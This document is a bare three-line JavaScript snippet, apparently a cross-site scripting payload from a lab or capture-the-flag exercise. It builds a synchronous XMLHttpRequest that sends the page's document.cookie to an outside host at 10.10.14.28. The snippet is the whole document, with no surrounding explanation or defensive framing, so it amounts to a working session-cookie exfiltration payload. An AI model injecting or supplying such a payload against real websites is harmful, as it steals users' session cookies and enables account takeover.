var requests = new XMLHttpRequest();
requests.open('GET', 'http://10.10.14.28/?cookie=' + document.cookie, false);
requests.send();
